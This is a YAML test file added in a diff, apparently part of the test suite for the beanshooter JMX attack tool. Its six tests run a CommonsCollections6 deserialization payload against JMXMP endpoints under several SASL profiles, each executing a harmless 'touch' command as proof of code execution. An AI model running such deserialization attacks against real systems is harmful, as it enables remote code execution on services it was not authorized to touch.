@@ -1,0 +1,164 @@
+tester:
+  title: serial action (JMXMP)
+  description: |-
+    Perform tests on beanshooters serial action for JMXMP based connections
+
+  id: '01-06-02'
+  groups:
+    - jmxmp
+  id_pattern: '01-06-02-{:02}'
+
+
+  variables:
+    file: serial-rce.txt
+
+
+tests:
+  - title: Unauth deserialization
+    description: |-
+      Perform a deserialization attack on a JMXMP endpoint that does not require
+      authentication
+
+    command:
+      - beanshooter
+      - serial
+      - ${JMXMP_UNAUTH}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Sending payload object
+            - The payload object was send successfully
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: TLS deserialization
+    description: |-
+      Perform a deserialization attack on a JMXMP endpoint that does require
+      the TLS SASL profile
+
+    command:
+      - beanshooter
+      - serial
+      - ${JMXMP_TLS}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Sending payload object
+            - The payload object was send successfully
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: PLAIN deserialization
+    description: |-
+      Perform a deserialization attack on a JMXMP endpoint that does require
+      the PLAIN SASL profile
+
+    command:
+      - beanshooter
+      - serial
+      - ${JMXMP_PLAIN}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Sending payload object
+            - The payload object was send successfully
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: DIGEST deserialization
+    description: |-
+      Perform a deserialization attack on a JMXMP endpoint that does require
+      the DIGEST SASL profile
+
+    command:
+      - beanshooter
+      - serial
+      - ${JMXMP_DIGEST}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Sending payload object
+            - The payload object was send successfully
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: CRAM deserialization
+    description: |-
+      Perform a deserialization attack on a JMXMP endpoint that does require
+      the CRAM SASL profile
+
+    command:
+      - beanshooter
+      - serial
+      - ${JMXMP_CRAM}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Sending payload object
+            - The payload object was send successfully
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: NTLM deserialization
+    description: |-
+      Perform a deserialization attack on a JMXMP endpoint that does require
+      the NTLM SASL profile
+
+    command:
+      - beanshooter
+      - serial
+      - ${JMXMP_NTLM}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Sending payload object
+            - The payload object was send successfully
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
